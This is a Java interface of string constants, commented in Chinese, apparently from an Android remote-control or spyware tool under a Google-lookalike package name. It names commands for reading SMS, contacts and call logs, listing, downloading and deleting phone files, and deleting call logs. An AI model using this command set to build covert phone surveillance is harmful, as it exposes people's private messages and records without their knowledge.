package com.google.undercontrol.domain;

public interface MsgType {
	/**
	 * 读取短信会话列表
	 */
	String READ_CONVERS_LIST = "read_convers_list";
	/**
	 * 短信会话列表
	 */
	String CONVERS_LIST = "convers_list";
	/**
	 * 读取短信列表
	 */
	String READ_SMS_LIST = "read_sms_list";
	/**
	 * 短信列表
	 */
	String SMS_LIST = "sms_list";
	
	/**
	 * 信息类型
	 */
	String TYPE = "type";
	/**
	 * 信息数据
	 */
	String DATA = "data";
	/**
	 * 读取手机内存文件列表
	 */
	String READ_ROM_FILE_LIST = "read_rom_file_list";
	/**
	 * 读取手机SD卡文件列表
	 */
	String READ_SDCARD_FILE_LIST = "read_sdcard_file_list";
	/**
	 * 文件列表
	 */
	String FILE_LIST="file_list";
	/**
	 * 读取文件列表
	 */
	String READ_FILE_LIST = "read_file_list";
	/**
	 * 下载文件
	 */
	String DOWNLOAD_FILE = "download_file";
	/**
	 * 删除文件
	 */
	String DELETE_FILE = "delete_file";
	/**
	 * 删除文件成功
	 */
	String DELETE_FILE_SUCCESS = "delete_file_success";
	/**
	 * 删除文件失败
	 */
	String DELETE_FILE_FAIL= "delete_file_fail";
	/**
	 * 读取联系人列表
	 */
	String READ_CONTACT_LIST = "read_contact_list";
	/**
	 * 联系人列表
	 */
	String CONTACT_LIST = "contact_list";
	/**
	 * 读取通话记录
	 */
	String READ_CALL_LOG_LIST = "read_call_log_list";
	/**
	 * 通话记录
	 */
	String CALL_LOG_LIST = "call_log_list";
	/**
	 * 删除通话记录
	 */
	String DEL_CALL_LOG = "del_call_log";
	/**
	 * 删除通话记录成功
	 */
	String DEL_CALL_LOG_SUCCESS = "del_call_log_success";
	/**
	 * 删除通话记录失败
	 */
	String DEL_CALL_LOG_FAIL = "del_call_log_fail";
}
